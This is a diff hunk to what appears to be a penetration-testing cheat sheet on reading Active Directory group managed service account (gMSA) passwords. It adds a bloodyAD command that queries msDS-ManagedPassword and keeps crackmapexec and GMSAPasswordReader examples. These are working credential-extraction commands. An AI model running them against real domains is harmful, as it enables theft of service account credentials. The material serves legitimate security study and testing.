@@ -22,6 +22,11 @@
   crackmapexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'
   ```
 
+* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)
+  ```ps1
+  bloodyAD --host 10.10.10.10 -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword
+  ```
+
 * [rvazarkar/GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
   ```ps1
   GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT
